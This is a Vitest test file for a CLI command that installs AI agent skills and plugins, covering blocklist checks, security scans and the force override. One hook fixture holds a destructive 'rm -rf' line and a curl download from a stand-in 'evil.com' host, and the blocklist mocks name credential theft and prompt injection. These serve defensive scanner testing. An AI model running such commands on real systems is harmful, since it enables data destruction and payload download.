import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// ---------------------------------------------------------------------------
// Mock node:fs
// ---------------------------------------------------------------------------
const mockMkdirSync = vi.fn();
const mockWriteFileSync = vi.fn();
const mockReadFileSync = vi.fn();
const mockExistsSync = vi.fn();
const mockCpSync = vi.fn();
const mockChmodSync = vi.fn();
const mockReaddirSync = vi.fn();
const mockStatSync = vi.fn();
const mockCopyFileSync = vi.fn();
const mockRmSync = vi.fn();

vi.mock("node:fs", () => ({
  mkdirSync: (...args: unknown[]) => mockMkdirSync(...args),
  writeFileSync: (...args: unknown[]) => mockWriteFileSync(...args),
  readFileSync: (...args: unknown[]) => mockReadFileSync(...args),
  existsSync: (...args: unknown[]) => mockExistsSync(...args),
  cpSync: (...args: unknown[]) => mockCpSync(...args),
  chmodSync: (...args: unknown[]) => mockChmodSync(...args),
  readdirSync: (...args: unknown[]) => mockReaddirSync(...args),
  statSync: (...args: unknown[]) => mockStatSync(...args),
  copyFileSync: (...args: unknown[]) => mockCopyFileSync(...args),
  rmSync: (...args: unknown[]) => mockRmSync(...args),
}));

// ---------------------------------------------------------------------------
// Mock node:path (pass-through with join tracking)
// ---------------------------------------------------------------------------
vi.mock("node:path", async () => {
  const actual = await vi.importActual<typeof import("node:path")>("node:path");
  return {
    ...actual,
    join: (...args: string[]) => actual.join(...args),
  };
});

// ---------------------------------------------------------------------------
// Mock node:crypto
// ---------------------------------------------------------------------------
const mockDigest = vi.fn().mockReturnValue("abcdef123456xxxx");
const mockUpdate = vi.fn().mockReturnValue({ digest: mockDigest });
vi.mock("node:crypto", () => ({
  createHash: () => ({ update: mockUpdate }),
}));

// ---------------------------------------------------------------------------
// Mock agents registry
// ---------------------------------------------------------------------------
const mockDetectInstalledAgents = vi.fn();
vi.mock("../agents/agents-registry.js", () => ({
  detectInstalledAgents: (...args: unknown[]) => mockDetectInstalledAgents(...args),
}));

// ---------------------------------------------------------------------------
// Mock lockfile
// ---------------------------------------------------------------------------
const mockEnsureLockfile = vi.fn();
const mockWriteLockfile = vi.fn();
vi.mock("../lockfile/index.js", () => ({
  ensureLockfile: (...args: unknown[]) => mockEnsureLockfile(...args),
  writeLockfile: (...args: unknown[]) => mockWriteLockfile(...args),
}));

// ---------------------------------------------------------------------------
// Mock scanner
// ---------------------------------------------------------------------------
const mockRunTier1Scan = vi.fn();
vi.mock("../scanner/index.js", () => ({
  runTier1Scan: (...args: unknown[]) => mockRunTier1Scan(...args),
}));

// ---------------------------------------------------------------------------
// Mock blocklist
// ---------------------------------------------------------------------------
const mockCheckBlocklist = vi.fn();
vi.mock("../blocklist/blocklist.js", () => ({
  checkBlocklist: (...args: unknown[]) => mockCheckBlocklist(...args),
}));

// ---------------------------------------------------------------------------
// Mock security (platform security check)
// ---------------------------------------------------------------------------
const mockCheckPlatformSecurity = vi.fn();
vi.mock("../security/index.js", () => ({
  checkPlatformSecurity: (...args: unknown[]) => mockCheckPlatformSecurity(...args),
}));

// ---------------------------------------------------------------------------
// Mock API client (registry lookup)
// ---------------------------------------------------------------------------
const mockGetSkill = vi.fn();
vi.mock("../api/client.js", () => ({
  getSkill: (...args: unknown[]) => mockGetSkill(...args),
}));

// ---------------------------------------------------------------------------
// Mock discovery (GitHub Trees skill discovery)
// ---------------------------------------------------------------------------
const mockDiscoverSkills = vi.fn();
vi.mock("../discovery/github-tree.js", () => ({
  discoverSkills: (...args: unknown[]) => mockDiscoverSkills(...args),
}));

// ---------------------------------------------------------------------------
// Mock project root resolution
// ---------------------------------------------------------------------------
const mockFindProjectRoot = vi.fn();
vi.mock("../utils/project-root.js", () => ({
  findProjectRoot: (...args: unknown[]) => mockFindProjectRoot(...args),
}));

// ---------------------------------------------------------------------------
// Mock agent filter (pass-through by default)
// ---------------------------------------------------------------------------
const mockFilterAgents = vi.fn();
vi.mock("../utils/agent-filter.js", () => ({
  filterAgents: (...args: unknown[]) => mockFilterAgents(...args),
}));

// ---------------------------------------------------------------------------
// Mock utils/output (suppress console output in tests)
// ---------------------------------------------------------------------------
vi.mock("../utils/output.js", () => ({
  bold: (s: string) => s,
  green: (s: string) => s,
  red: (s: string) => s,
  yellow: (s: string) => s,
  dim: (s: string) => s,
  cyan: (s: string) => s,
  spinner: () => ({ stop: vi.fn() }),
}));

// ---------------------------------------------------------------------------
// Import module under test AFTER mocks
// ---------------------------------------------------------------------------
const { addCommand } = await import("./add.js");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeScanResult(overrides: Record<string, unknown> = {}) {
  return {
    verdict: "PASS",
    findings: [],
    score: 100,
    patternsChecked: 37,
    criticalCount: 0,
    highCount: 0,
    mediumCount: 0,
    lowCount: 0,
    infoCount: 0,
    durationMs: 1,
    ...overrides,
  };
}

function makeAgent(overrides: Record<string, unknown> = {}) {
  return {
    id: "claude-code",
    displayName: "Claude Code",
    localSkillsDir: ".claude/commands",
    globalSkillsDir: "~/.claude/commands",
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

beforeEach(() => {
  vi.clearAllMocks();
  // Suppress console output during tests
  vi.spyOn(console, "log").mockImplementation(() => {});
  vi.spyOn(console, "error").mockImplementation(() => {});
  // Default: platform security returns null (non-fatal, no external results)
  mockCheckPlatformSecurity.mockResolvedValue(null);
  // Default: findProjectRoot returns cwd (same as old behavior)
  mockFindProjectRoot.mockReturnValue(process.cwd());
  // Default: filterAgents passes through agents unchanged
  mockFilterAgents.mockImplementation((agents: unknown[]) => agents);
});

describe("addCommand with --plugin option (plugin directory support)", () => {
  beforeEach(() => {
    // Plugin path hits blocklist check first — return null (not blocked)
    mockCheckBlocklist.mockResolvedValue(null);
  });

  // TC-001: --plugin <name> flag selects sub-plugin from multi-plugin repo
  describe("TC-001: plugin flag selects sub-plugin directory", () => {
    it("selects the sw-frontend plugin directory from a local path with plugins/ structure", async () => {
      const localPath = "/tmp/test-repo";

      // The plugin directory path: /tmp/test-repo/plugins/specweave-frontend/
      mockExistsSync.mockImplementation((p: string) => {
        if (p.includes("plugins/specweave-frontend")) return true;
        if (p.includes(".claude-plugin/marketplace.json")) return true;
        return false;
      });

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.225",
            plugins: [
              { name: "sw", source: "./plugins/specweave", version: "1.0.225" },
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "";
      });

      // readdirSync: recursive for collectPluginContent, non-recursive for copyPluginFiltered
      mockReaddirSync.mockImplementation((_dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return ["skills/SKILL.md", "hooks/setup.sh"];
        }
        // copyPluginFiltered calls readdirSync without recursive
        return ["SKILL.md"];
      });

      // statSync for copyPluginFiltered: treat everything as a file
      mockStatSync.mockReturnValue({ isDirectory: () => false, isFile: () => true });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Call addCommand with plugin option and pluginDir (local source)
      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // copyFileSync should have been called (copyPluginFiltered uses it)
      expect(mockCopyFileSync).toHaveBeenCalled();
      const cpCall = mockCopyFileSync.mock.calls[0];
      // Source should include plugins/specweave-frontend
      expect(cpCall[0]).toContain("plugins/specweave-frontend");
    });
  });

  // TC-002: Full directory structure preserved on installation
  describe("TC-002: full directory structure is preserved", () => {
    it("recursively copies all subdirectories (skills, hooks, commands, agents, .claude-plugin) to cache", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Plugin content";
      });

      // copyPluginFiltered walks the tree: top-level has dirs, each dir has a file
      let depth = 0;
      mockReaddirSync.mockImplementation((_dir: string, opts?: unknown) => {
        // collectPluginContent uses { recursive: true }
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return ["skills/SKILL.md", "hooks/setup.sh"];
        }
        // copyPluginFiltered: first call returns subdirs, deeper calls return files
        if (depth === 0) {
          depth++;
          return ["skills", "hooks"];
        }
        return ["SKILL.md"];
      });

      mockStatSync.mockImplementation((p: string) => ({
        isDirectory: () => p.endsWith("skills") || p.endsWith("hooks"),
        isFile: () => !p.endsWith("skills") && !p.endsWith("hooks"),
      }));

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // mkdirSync is called for each directory level (recursive copy)
      expect(mockMkdirSync).toHaveBeenCalled();
      // copyFileSync is called for files within subdirectories
      expect(mockCopyFileSync).toHaveBeenCalled();
      // Verify it created subdirectory structure
      const mkdirCalls = mockMkdirSync.mock.calls.map((c: unknown[]) => String(c[0]));
      expect(mkdirCalls.some((p: string) => p.includes("skills") || p.includes("hooks"))).toBe(true);
    });
  });

  // TC-003: Hook script permissions fixed
  describe("TC-003: hook scripts get executable permission", () => {
    it("sets chmod 0o755 on all .sh files in hooks/ after install", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Hook content";
      });

      // When scanning for .sh files in the installed directory
      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        // Return file entries when called with recursive option
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/pre-install.sh",
            "hooks/post-install.sh",
            "skills/SKILL.md",
            "commands/init.md",
          ];
        }
        return [];
      });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // chmodSync should be called for each .sh file with 0o755
      const chmodCalls = mockChmodSync.mock.calls;
      const shCalls = chmodCalls.filter(
        (call: unknown[]) => typeof call[0] === "string" && (call[0] as string).endsWith(".sh")
      );
      expect(shCalls.length).toBeGreaterThanOrEqual(2);
      for (const call of shCalls) {
        expect(call[1]).toBe(0o755);
      }
    });
  });

  // TC-004: Security scanning covers all plugin files
  describe("TC-004: security scan covers all plugin files", () => {
    it("scans concatenated content from all plugin files, not just SKILL.md", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);

      const hookContent = "#!/bin/bash\nrm -rf /tmp/evil\ncurl http://evil.com/payload";
      const skillContent = "# My Skill\nSafe content here";

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        if (p.includes("hooks/")) return hookContent;
        if (p.includes("SKILL.md")) return skillContent;
        return "";
      });

      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/deploy.sh",
            "skills/SKILL.md",
          ];
        }
        return [];
      });

      // The scan should receive concatenated content from all files
      mockRunTier1Scan.mockReturnValue(
        makeScanResult({
          verdict: "FAIL",
          score: 20,
          findings: [
            {
              patternId: "FS-001",
              patternName: "Recursive delete",
              severity: "critical",
              category: "filesystem-access",
              match: "rm -rf",
              lineNumber: 2,
              context: "rm -rf /tmp/evil",
            },
            {
              patternId: "NA-001",
              patternName: "Curl/wget to unknown host",
              severity: "high",
              category: "network-access",
              match: 'curl http://evil.com/payload',
              lineNumber: 3,
              context: "curl http://evil.com/payload",
            },
          ],
          criticalCount: 1,
          highCount: 1,
        })
      );

      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Force install despite failure to reach lockfile update
      await addCommand(localPath, {
        plugin: "sw-frontend",
        pluginDir: localPath,
        force: true,
      });

      // runTier1Scan should have been called with content containing hook file data
      expect(mockRunTier1Scan).toHaveBeenCalled();
      const scannedContent = mockRunTier1Scan.mock.calls[0][0] as string;
      // The scanned content should include hook file content (rm -rf, curl)
      expect(scannedContent).toContain("rm -rf");
      expect(scannedContent).toContain("curl");
    });
  });
});

// ---------------------------------------------------------------------------
// T-013: Blocklist check in GitHub path
// ---------------------------------------------------------------------------

describe("addCommand blocklist check (GitHub path)", () => {
  // Mock global fetch for GitHub path tests
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Safe Skill\nNormal content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("blocks installation when skill is on the blocklist", async () => {
    mockCheckBlocklist.mockResolvedValue({
      skillName: "evil-repo",
      threatType: "credential-theft",
      severity: "critical",
      reason: "Steals AWS credentials",
      evidenceUrls: [],
      discoveredAt: "2026-02-01T00:00:00Z",
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("owner/evil-repo", {}),
    ).rejects.toThrow("process.exit");

    expect(mockCheckBlocklist).toHaveBeenCalledWith("evil-repo", undefined);
    expect(mockExit).toHaveBeenCalledWith(1);

    // Tier 1 scan should NOT have been called (blocked before scan)
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("BLOCKED");
    expect(errorOutput).toContain("credential-theft");

    mockExit.mockRestore();
  });

  it("proceeds normally when skill is NOT on the blocklist", async () => {
    mockCheckBlocklist.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/safe-repo", {});

    expect(mockCheckBlocklist).toHaveBeenCalledWith("safe-repo", undefined);
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("uses --skill name for blocklist check when provided", async () => {
    mockCheckBlocklist.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/repo", { skill: "my-skill" });

    expect(mockCheckBlocklist).toHaveBeenCalledWith("my-skill", undefined);
  });
});

// ---------------------------------------------------------------------------
// T-014: Blocklist check in plugin path
// ---------------------------------------------------------------------------

describe("addCommand blocklist check (plugin path)", () => {
  it("blocks plugin installation when plugin is on the blocklist", async () => {
    mockCheckBlocklist.mockResolvedValue({
      skillName: "evil-plugin",
      threatType: "prompt-injection",
      severity: "critical",
      reason: "Injects malicious prompts",
      evidenceUrls: [],
      discoveredAt: "2026-02-01T00:00:00Z",
    });

    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "evil-plugin", source: "./plugins/evil-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("source", { plugin: "evil-plugin", pluginDir: "/tmp/test" }),
    ).rejects.toThrow("process.exit");

    expect(mockCheckBlocklist).toHaveBeenCalledWith("evil-plugin");
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    mockExit.mockRestore();
  });

  it("proceeds with plugin installation when not blocklisted", async () => {
    mockCheckBlocklist.mockResolvedValue(null);
    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "safe-plugin", source: "./plugins/safe-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    mockReaddirSync.mockReturnValue(["SKILL.md"]);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("source", { plugin: "safe-plugin", pluginDir: "/tmp/test" });

    expect(mockCheckBlocklist).toHaveBeenCalledWith("safe-plugin");
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// T-015: --force override with warning for blocked skills
// ---------------------------------------------------------------------------

describe("addCommand --force with blocked skill", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("shows warning box and continues when --force + blocked (GitHub path)", async () => {
    mockCheckBlocklist.mockResolvedValue({
      skillName: "evil-skill",
      threatType: "credential-theft",
      severity: "critical",
      reason: "Base64-encoded AWS credential exfil",
      evidenceUrls: [],
      discoveredAt: "2026-02-01T00:00:00Z",
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/evil-skill", { force: true });

    // Should show warning but NOT exit
    const allOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(allOutput).toContain("WARNING");
    expect(allOutput).toContain("malicious");

    // Should proceed to tier 1 scan
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("shows warning box and continues when --force + blocked (plugin path)", async () => {
    mockCheckBlocklist.mockResolvedValue({
      skillName: "evil-plugin",
      threatType: "prompt-injection",
      severity: "critical",
      reason: "Injects malicious prompts",
      evidenceUrls: [],
      discoveredAt: "2026-02-01T00:00:00Z",
    });

    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "evil-plugin", source: "./plugins/evil-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    mockReaddirSync.mockReturnValue(["SKILL.md"]);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("source", { plugin: "evil-plugin", pluginDir: "/tmp/test", force: true });

    const allOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(allOutput).toContain("WARNING");

    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// T-016/T-017: Platform security check in GitHub path
// ---------------------------------------------------------------------------

describe("addCommand platform security check (GitHub path)", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Safe Skill\nNormal content",
    }) as unknown as typeof fetch;

    mockCheckBlocklist.mockResolvedValue(null);
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("blocks installation when platform reports CRITICAL findings", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: true,
      overallVerdict: "FAIL",
      providers: [
        { provider: "semgrep", status: "FAIL", verdict: "critical", criticalCount: 3 },
        { provider: "snyk", status: "PASS", verdict: "clean", criticalCount: 0 },
      ],
      reportUrl: "/skills/evil-skill/security",
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("owner/evil-skill", {}),
    ).rejects.toThrow("process.exit");

    expect(mockExit).toHaveBeenCalledWith(1);

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("BLOCKED");
    expect(errorOutput).toContain("CRITICAL");
    expect(errorOutput).toContain("semgrep");

    // Should NOT proceed to tier 1 scan
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    mockExit.mockRestore();
  });

  it("shows warning and proceeds when CRITICAL + --force", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: true,
      overallVerdict: "FAIL",
      providers: [
        { provider: "semgrep", status: "FAIL", verdict: "critical", criticalCount: 2 },
      ],
      reportUrl: "/skills/evil-skill/security",
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/evil-skill", { force: true });

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("WARNING");
    expect(errorOutput).toContain("CRITICAL");
    expect(errorOutput).toContain("semgrep");

    // Should proceed to tier 1 scan
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("shows info message and proceeds when scans are PENDING", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: false,
      overallVerdict: "PENDING",
      providers: [
        { provider: "semgrep", status: "PENDING", verdict: null, criticalCount: 0 },
      ],
      reportUrl: "/skills/test-skill/security",
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/test-skill", {});

    const logOutput = (console.log as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(logOutput).toContain("pending");

    // Should proceed to tier 1 scan
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("proceeds normally when platform check returns null (network error)", async () => {
    mockCheckPlatformSecurity.mockResolvedValue(null);

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/safe-skill", {});

    // Should proceed to tier 1 scan without any blocking
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Multi-skill repo discovery + install
// ---------------------------------------------------------------------------

describe("addCommand multi-skill discovery (GitHub path)", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckBlocklist.mockResolvedValue(null);
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-007: Multi-skill repo installs all discovered skills
  it("installs all discovered skills from a multi-skill repo", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
      { name: "foo", path: "skills/foo/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/foo/SKILL.md" },
      { name: "bar", path: "skills/bar/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/bar/SKILL.md" },
    ]);

    // Each fetch for individual SKILL.md content succeeds
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    // Should have fetched 3 SKILL.md files
    expect(globalThis.fetch).toHaveBeenCalledTimes(3);
    // Should have scanned 3 skills
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(3);
    // Lockfile should have 3 entries
    expect(mockWriteLockfile).toHaveBeenCalled();
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(3);
    expect(lockArg.skills).toHaveProperty("repo");
    expect(lockArg.skills).toHaveProperty("foo");
    expect(lockArg.skills).toHaveProperty("bar");
  });

  // TC-008: Single-skill repo behaves identically to before
  it("installs single skill when repo has only root SKILL.md", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(1);
    expect(lockArg.skills).toHaveProperty("repo");
  });

  // TC-009: --skill flag bypasses discovery
  it("bypasses discovery when --skill flag is provided", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Specific skill",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", { skill: "specific" });

    // Discovery should NOT have been called
    expect(mockDiscoverSkills).not.toHaveBeenCalled();
    // Should fetch from skills/specific/SKILL.md
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "https://raw.githubusercontent.com/owner/repo/main/skills/specific/SKILL.md"
    );
  });

  // TC-010: Failed scan for one skill does not block others
  it("skips failed skills and installs the rest", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "good1", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
      { name: "bad", path: "skills/bad/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/bad/SKILL.md" },
      { name: "good2", path: "skills/good2/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/good2/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    // Second scan fails
    mockRunTier1Scan
      .mockReturnValueOnce(makeScanResult())
      .mockReturnValueOnce(makeScanResult({ verdict: "FAIL", score: 10 }))
      .mockReturnValueOnce(makeScanResult());

    await addCommand("owner/repo", {});

    // All 3 scanned, but only 2 installed
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(3);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(2);
    expect(lockArg.skills).toHaveProperty("good1");
    expect(lockArg.skills).toHaveProperty("good2");
    expect(lockArg.skills).not.toHaveProperty("bad");
  });

  // TC-011: Discovery API failure falls back to single-skill install
  it("falls back to single root SKILL.md when discovery returns empty", async () => {
    mockDiscoverSkills.mockResolvedValue([]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Root skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    // Should fall back to fetching root SKILL.md directly
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "https://raw.githubusercontent.com/owner/repo/main/SKILL.md"
    );
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
  });
});

// ---------------------------------------------------------------------------
// Registry install (installFromRegistry) — no slash in source
// ---------------------------------------------------------------------------

describe("addCommand registry install (no slash in source)", () => {
  beforeEach(() => {
    mockCheckBlocklist.mockResolvedValue(null);
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
